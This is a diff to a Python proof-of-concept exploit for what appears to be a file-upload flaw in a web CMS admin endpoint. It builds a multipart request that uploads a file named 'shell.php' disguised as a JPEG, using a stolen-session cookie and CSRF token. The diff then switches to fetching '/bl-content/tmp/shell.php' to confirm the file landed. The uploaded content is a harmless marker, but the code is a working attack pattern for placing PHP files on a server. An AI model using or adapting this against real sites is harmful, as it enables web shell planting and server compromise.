@@ -47,7 +47,7 @@ def exp(host, token, cookie_b,user_agent):
            + 'Content-Disposition: form-data; name="images[]"; filename="shell.php"\n' \
            + 'Content-Type: image/jpeg\n' \
            + '\n' \
-           + '11111 \n' \
+           + 'hello \n' \
            + '----------327107347321150223463725464476\n' \
            + 'Content-Disposition: form-data; name="uuid"\n' \
            + '\n' \
@@ -59,12 +59,11 @@ def exp(host, token, cookie_b,user_agent):
            + '{csrftokrn}\n'.format(csrftokrn=token) \
            + '----------327107347321150223463725464476--\n'
 
-    response = requests.post(host + '/admin/ajax/upload-images', headers=headers, data=data, cookies=cookies)
-    print('response_code', response.status_code)
-    if response.status_code == 200:
+    response = requests.get(host + '/bl-content/tmp/shell.php', headers=headers, data=data, cookies=cookies)
+    if "hello" in response.text:
         print("Poc Success!")
     else:
-         print("Poc failed!")    
+        print("Poc failed!")    
     
 
 
